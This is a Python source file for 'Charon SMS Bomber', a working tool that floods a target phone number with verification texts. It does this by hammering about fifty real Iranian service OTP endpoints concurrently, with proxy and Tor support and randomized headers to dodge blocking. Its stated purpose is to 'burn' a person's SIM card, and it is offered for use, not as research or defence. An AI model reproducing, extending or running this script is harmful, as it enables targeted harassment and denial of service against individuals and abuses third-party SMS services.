'''
######################################################################################
# About :                                                                            #
#                                                                                    #
# Description: This Program Powered By Charon Security Agency                        #
# Made for: Fun and burning the SIM card of a person's phone                         #
# Programmer: Ch4120n                                                                #
#                                                                                    #
# Copyright :                                                                        #
#                                                                                    #
# Charon SMS Bomber (C) <2024> <Charon Security Agency>                              #
# This Program Is Free Software: You Can Redistribute It                             #
# It Under The Terms Of The  `Charon General Black License`  As Published By         #
# The Black Hacking Software Foundation , Either Version 1 Of The License.           #
# This Program Is Distributed In The Hope That It Will Be Useful,                    #
# But Without Any Warranty .  See The                                                #
# `Charon General Black License` For More Details.                                   #
# You Should Have Received A Copy Of The  `Charon General Black License`             #
# Along With This Program. If Not, See <http://charonsecurityagency.github.io/cgbl>  #
#                                                                                    #
######################################################################################
'''


import requests
import random
import time
# import json
# import re
import sys
# import signal
import argparse
import concurrent.futures
from threading import Thread
from pystyle import Colors, Colorate
from datetime import datetime
from fake_useragent import UserAgent
from stem import Signal
from stem.control import Controller
from alive_progress import alive_bar
from fake_headers import Headers
from colorama import Fore, init, Style
init()





class Logs:
    # def __init__(self) -> None:
    @classmethod
    def gettime(self):
        return str(datetime.now().strftime("%H:%M:%S"))
    # def __init__(self):
    #     
    # self.
    @classmethod
    def success(self, text):
        
        return f"{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}{Logs.gettime()}{Fore.LIGHTBLUE_EX}] [{Fore.LIGHTGREEN_EX}SUCCESS{Fore.LIGHTBLUE_EX}] {Fore.RESET}{text}"
	
    # @classmethod
    # def warning(self,text):
    #     print(Fore.LIGHTBLUE_EX+"["+Fore.LIGHTYELLOW_EX+datetime.now().strftime("%H:%M:%S")+Fore.LIGHTBLUE_EX+"] ["+Fore.LIGHTYELLOW_EX+"WARNING"+Fore.LIGHTBLUE_EX+"] "+Fore.RESET+text)

    @classmethod
    def failed(self,text):
        return f"{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}{Fore.LIGHTYELLOW_EX}{Logs.gettime()}{Fore.LIGHTBLUE_EX}] [{Fore.LIGHTRED_EX}FAILED{Fore.LIGHTBLUE_EX}] {Fore.RESET}{text}"

class CusHelpFormatter(argparse.HelpFormatter):
    """A custom HelpFormatter class that capitalizes the first letter of usage text."""
    def add_usage(self, usage, actions, groups, prefix=None):
        """Add usage method to display the usage text with the first letter capitalized."""
        if prefix is None:
            prefix = ''
        return super(CusHelpFormatter, self).add_usage(
            usage, actions, groups, prefix)


class CharonSMSBomber:
    headers = Headers()
    requests_codes = {
        403 : 'Forbidden',
        429 : 'Too Many Requests',
        500 : 'Internal Server Error',
        400 : 'Bad Request',
        423 : 'Locked',
        412 : 'Precondition Failed',
        404 : 'Not Found',
        406 : 'Not Acceptable',
        402 : 'Payment Required',
        405 : 'Method Not Allowed',
        200 : Fore.LIGHTGREEN_EX+'OK',
        201 : Fore.LIGHTGREEN_EX+'Created',
        401 : 'Unauthorized',
        407 : 'Proxy Authentication Required',
        408 : 'Request Timeout',
        451 : 'Unavailable For Legal Reasons',
        501 : 'Not Implemented',
        502 : 'Bad Gateway'
        
    }
    def __init__(self):
        # signal.signal(signal.SIGINT, self.sigint_handler)
        parser = argparse.ArgumentParser(add_help=False, usage=self.Usage(), exit_on_error=False,formatter_class=CusHelpFormatter)
        parser.add_argument(
            'TargetPhone',
            help='Specify the target phone number'
            )
        parser.add_argument(
            "-t",
            "--times",
            help="Specify the number of bombing times, default is 7",
            type=int,
            default=1,
            )
        parser.add_argument(
            "-p",
            "--process",
            help="Specify the number of processes, default is 5",
            type=int,
            default=5,
            )
        
        parser.add_argument(
            "-x",
            "--proxy",
            help="Set the proxy for requests (http/https/socks)"
            )
        parser.error = lambda message: print(self.Usage()) or sys.exit(2)
        args = parser.parse_args()
        phone_number = args.TargetPhone
        bombing_times = args.times
        process_num = args.process
        proxy = args.proxy
        
        if proxy:
            print(f"\n{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}] {Fore.LIGHTRED_EX} Using Proxy: {proxy}")
            proxy_dict = {"http": proxy, "https": proxy}
        else:
            proxy_dict = None
        
        self.apis = [
            {
                "name": "Snapp V1",
                "url": "https://api.snapp.ir/api/v1/sms/link",
                "data": {"phone": phone_number},
            },
            {
                "name": "Snapp V2",
                "url": f"https://digitalsignup.snapp.ir/ds3/api/v3/otp?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&cellphone={phone_number}",
                "data": {"cellphone": phone_number},
            },
            {
                'name' : "DoctorNext",
                'url'  : "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token",
                'data' : {"source":"besina","mobile":phone_number,"key":"U2FsdGVkX197qqA2kXzD+GTu4qn/QCW1oYnbXhiK0qK1TRMg2YK09y1m/VBTqQ33QuYbBsUqHz3Q4BTANrnNgA=="}
            },
            {
                'name' : 'Tapsi',
                'url'  : 'https://api.tapsi.cab/api/v2.2/user',
                'data' : {"credential":{"phoneNumber":phone_number,"role":"PASSENGER"},"otpOption":"SMS"}
            },
            {
                'name' : 'Snapp V3',
                'url'  : 'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass',
                'data' : f'cellphone={phone_number}&platform=PWA'
            },
            {
              'name' : 'Behtarino',
              'url' : 'https://bck.behtarino.com/api/v1/users/jwt_phone_verification/',
              'data':   {"phone":phone_number}
            },
            {
                'name' : 'drdr',
                'url' : 'https://drdr.ir/api/v3/auth/login/mobile/init',
                'data' : {"mobile":phone_number}  
            },
            {
                'name' : 'Okala',
                'url' : 'https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister',
                'data' : {"mobile":phone_number,"confirmTerms":'true',"notRobot":'false'}
            },
            {
                'name' : 'Mrbilit',
                'url' : 'https://auth.mrbilit.ir/api/login/exists/v2'  ,
                'data' : f'mobileOrEmail={phone_number}&source=2&sendTokenIfNot=true'
            },
            {
                'name' : 'footbal360',
                'url' : 'https://football360.ir/api/auth/v2/send_otp/',
                'data' : {"phone_number":phone_number,"otp_token":"JZnul6S6Fl7bfFr6yFcziftf","auto_read_platform":"ST"}  
            },
            {
                "name": "Achareh",
                "url": "https://api.achareh.co/v2/accounts/login/",
                "data": {"phone": f"98{phone_number[1:]}"},
            },
            {
                "name": "Zigap",
                "url": "https://zigap.smilinno-dev.com/api/v1.6/authenticate/sendotp",
                "data": {"phoneNumber": f"+98{phone_number[1:]}"},
            },
            {
                "name": "Jabama",
                "url": "https://gw.jabama.com/api/v4/account/send-code",
                "data": {"mobile": phone_number},
            },
            {
                "name": "Banimode",
                "url": "https://mobapi.banimode.com/api/v2/auth/request",
                "data": {"phone": phone_number},
            },
            {
                "name": "Classino",
                "url": "https://student.classino.com/otp/v1/api/login",
                "data": {"mobile": phone_number},
            },
            {
                "name": "Digikala V1",
                "url": "https://api.digikala.com/v1/user/authenticate/",
                "data": {"username": phone_number, "otp_call": False},
            },
            {
                "name": "Digikala V2",
                "url": "https://api.digikala.com/v1/user/forgot/check/",
                "data": {"username": phone_number},
            },
            {
                "name": "Sms.ir",
                "url": "https://appapi.sms.ir/api/app/auth/sign-up/verification-code",
                "data": phone_number,
            },
            {
                "name": "Alibaba",
                "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp",
                "data": {"phoneNumber": phone_number[1:]},
            },
            {
                "name": "Divar",
                "url": "https://api.divar.ir/v5/auth/authenticate",
                "data": {"phone": phone_number},
            },
            {
                "name": "Sheypoor",
                "url": "https://www.sheypoor.com/api/v10.0.0/auth/send",
                "data": {"username": phone_number},
            },
            {
                "name": "Bikoplus",
                "url": "https://bikoplus.com/account/check-phone-number",
                "data": {"phoneNumber": phone_number},
            },
            {
                "name": "Mootanroo",
                "url": "https://api.mootanroo.com/api/v3/auth/send-otp",
                "data": {"PhoneNumber": phone_number},
            },
            {
                "name": "Tap33",
                "url": "https://tap33.me/api/v2/user",
                "data": {"credential": {"phoneNumber": phone_number, "role": "BIKER"}},
            },
            {
                "name": "Tapsi",
                "url": "https://api.tapsi.ir/api/v2.2/user",
                "data": {
                    "credential": {"phoneNumber": phone_number, "role": "DRIVER"},
                    "otpOption": "SMS",
                },
            },
            {
                "name": "GapFilm",
                "url": "https://core.gapfilm.ir/api/v3.1/Account/Login",
                "data": {"Type": "3", "Username": phone_number[1:]},
            },
            {
                "name": "IToll",
                "url": "https://app.itoll.com/api/v1/auth/login",
                "data": {"mobile": phone_number},
            },
            {
                "name": "Anargift",
                "url": "https://api.anargift.com/api/v1/auth/auth",
                "data": {"mobile_number": phone_number},
            },
            {
                "name": "Nobat",
                "url": "https://nobat.ir/api/public/patient/login/phone",
                "data": {"mobile": phone_number[1:]},
            },
            {
                "name": "Lendo",
                "url": "https://api.lendo.ir/api/customer/auth/send-otp",
                "data": {"mobile": phone_number},
            },
            {
                "name": "Hamrah-Mechanic",
                "url": "https://www.hamrah-mechanic.com/api/v1/membership/otp",
                "data": {"PhoneNumber": phone_number},
            },
            {
                "name": "Abantether",
                "url": "https://abantether.com/users/register/phone/send/",
                "data": {"phoneNumber": phone_number},
            },
            {
                "name": "OKCS",
                "url": "https://my.okcs.com/api/check-mobile",
                "data": {"mobile": phone_number},
            },
            {
                "name": "Tebinja",
                "url": "https://www.tebinja.com/api/v1/users",
                "data": {"username": phone_number},
            },
            {
                "name": "Bit24",
                "url": "https://bit24.cash/auth/bit24/api/v3/auth/check-mobile",
                "data": {"mobile": phone_number},
            },
            {
                "name": "Rojashop",
                "url": "https://rojashop.com/api/send-otp-register",
                "data": {"mobile": phone_number},
            },
            {
                "name": "Paklean",
                "url": "https://client.api.paklean.com/download",
                "data": {"tel": phone_number},
            },
            {
                "name": "Khodro45",
                "url": "https://khodro45.com/api/v1/customers/otp/",
                "data": {"mobile": phone_number},
            },
            {
                "name": "Delino",
                "url": "https://www.delino.com/user/register",
                "data": {"mobile": phone_number},
            },
            {
                "name": "DigikalaJet",
                "url": "https://api.digikalajet.ir/user/login-register/",
                "data": {"phone": phone_number},
            },
            {
                "name": "Miare",
                "url": "https://www.miare.ir/api/otp/driver/request/",
                "data": {"phone_number": phone_number},
            },
            {
                "name": "Dosma",
                "url": "https://app.dosma.ir/api/v1/account/send-otp/",
                "data": {"mobile": phone_number},
            },
            {
                "name": "Ostadkr",
                "url": "https://api.ostadkr.com/login",
                "data": {"mobile": phone_number},
            },
            {
                "name": "Sibbazar",
                "url": "https://sandbox.sibbazar.com/api/v1/user/invite",
                "data": {"username": phone_number},
            },
            {
                "name": "Namava",
                "url": "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
                "data": {"UserName": f"+98{phone_number[1:]}"},
            },
            {
                "name": "Shab",
                "url": "https://api.shab.ir/api/fa/sandbox/v_1_4/auth/check-mobile",
                "data": {"mobile": phone_number},
            },
            {
                "name": "Bitpin",
                "url": "https://api.bitpin.org/v2/usr/signin/",
                "data": {"phone": phone_number},
            },
            {
                "name": "Taaghche",
                "url": "https://gw.taaghche.com/v4/site/auth/signup",
                "data": {"contact": phone_number},
            },
            {
                'name' : 'Torob',
                'url'  : 'https://api.torob.com/a/phone/send-pin/',
                'data' : f'phone_number={phone_number}'
            }
            # {
            #     "name": "Digipay",
            #     "url": "https://www.mydigipay.com/digipay/api/users/send-sms",
            #     "data": {"cellNumber": phone_number},
            # }, # This one will send your IP to your target.
        
        ]
        self.run(bombing_times, process_num, proxy_dict)
        
        
    def Horizontal(self, logo=None):
        return Colorate.Horizontal(Colors.rainbow, logo)
    def send_request(self, api_name, api_url, data, timeout, proxy=None):
        generated_headers = self.headers.generate()
        # current_time = datetime.now().strftime("%H:%M:%S")

        try:
            self.response = requests.post(
                api_url,
                headers=generated_headers,
                json=data,
                timeout=timeout,
                proxies=proxy,
            )
            self.response.raise_for_status()
            return Logs.success(f"{Fore.LIGHTYELLOW_EX}{api_name} {Fore.LIGHTWHITE_EX}=> {Fore.LIGHTGREEN_EX}Successfully Sent Spam")
            # return f"{Fore.YELLOW}[{current_time}] {Fore.GREEN}[+] {api_name}:{Style.RESET_ALL} OK"
        except requests.exceptions.RequestException:
            # print(e)
            # print(str(error).split(':'))
            # return f"{Fore.YELLOW}[{current_time}] {Fore.RED}[-] {api_name}:{Style.RESET_ALL} Failed - {e}"
            error = self.requests_codes.get(self.response.status_code)
            return Logs.failed(f"{Fore.LIGHTYELLOW_EX}{api_name} {Fore.LIGHTWHITE_EX}=> {Fore.LIGHTRED_EX}Failed To Send Spam {Fore.LIGHTWHITE_EX}=> {Fore.LIGHTRED_EX}{self.response.status_code} : {error}")
    
    def process_target(self, api, proxy):
        return self.send_request(api["name"], api["url"], api["data"], timeout=5, proxy=proxy)
    
    def sigint_handler(self, signal, frame):
        print(f"\n{Fore.LIGHTBLUE_EX}[{Fore.LIGHTRED_EX}!{Fore.LIGHTBLUE_EX}] {Fore.LIGHTRED_EX}User interrupted the process.{Style.RESET_ALL}")
        sys.exit(1)
    
    def Usage(self):
        return f'''{Fore.LIGHTGREEN_EX}
##########################################################################################
# {Fore.LIGHTRED_EX}Charon SMS Bomber {Fore.LIGHTBLUE_EX}({Fore.LIGHTYELLOW_EX}It can only be used for Iranian people{Fore.LIGHTBLUE_EX}){Fore.LIGHTGREEN_EX}                             #
#                                                                                        #
#                                                                                        #
# Usage: chsmsbomb [Options] <TargetPhone>                                               #
# Options:  -t, --times - number of bombing times # Default: 7                           #
#           -p, --process - number of processes   # Default: 5                           #
#           -x, --proxy - Set the proxy           # (http/https/socks)                   #
#                                                                                        #
# Example: chsmsbomber 09XXXXXXXXX --times 10 --process 3 -x socks5://127.0.0.1:9050     #
#                                                                                        #
##########################################################################################
        '''
        
    def run(self, bombing_times, process_num, proxy_dict, verbose_level:bool=False):
        print(self.Horizontal(self.Logo()))
        try:
            with alive_bar(bombing_times * len(self.apis)) as progress_bar:
                with concurrent.futures.ThreadPoolExecutor(
                    max_workers=process_num
                ) as executor:
                    futures = [
                        executor.submit(self.process_target, api, proxy_dict)
                        for api in self.apis * bombing_times
                    ]
                    # numbers = 0
                    for future in concurrent.futures.as_completed(futures):
                        progress_bar()
                        result = future.result()
                        # numbers += 1
                        if "SUCCESS" in result:
                           print(f"{Fore.GREEN}{result}{Style.RESET_ALL}")
                        else:
                           print(f"{Fore.RED}{result}{Style.RESET_ALL}")

                    time.sleep(1)

            if not verbose_level:
                results = [future.result() for future in futures]
                succeeded = [result for result in results if "SUCCESS" in result]
                failed = [result for result in results if "FAILED" in result]

                print(
                    f"\nSucceeded: {Fore.GREEN}{len(succeeded)}{Style.RESET_ALL}"
                    f"\nFailed: {Fore.RED}{len(failed)}{Style.RESET_ALL}"
                )

        except KeyboardInterrupt:
            print(f"\n{Fore.LIGHTBLUE_EX}[{Fore.LIGHTRED_EX}!{Fore.LIGHTBLUE_EX}] {Fore.LIGHTRED_EX}User interrupted the process.{Style.RESET_ALL}")
            sys.exit(1)
    
    def Logo(self):
        a1 = r'''
              ^         
             | |        
           @#####@      
         (###   ###)-.  
       .(###     ###) \ 
      /  (###   ###)   )
     (=-  .@#####@|_--" 	Powered By [ Ch4120N ]
     /\    \_|l|_/ (\   	Let's burn a SIM card
    (=-\     |l|    /   
     \  \.___|l|___/    
     /\      |_|   /    
    (=-\._________/\    
     \             /    
       \._________/     
         #  ----  #     
         #   __   #       
         \########/      

             V
                 V
               V
               
    '''
        a2 = '''
        Let's burn a SIM card
      ,________________________________       
**** |__________,----------._ [____]  ""-,__  __...-----==="
             (_( Powered By)____________/   ""             |
                `----------' Ch4120N[ ))"-,                |
                                     ""    `,  _,--...___  |
                                             `/          """

        '''
        
        arts = [a1, a2]
        attacking_art = random.choice(arts)
        return attacking_art
        
            


CharonSMSBomber()
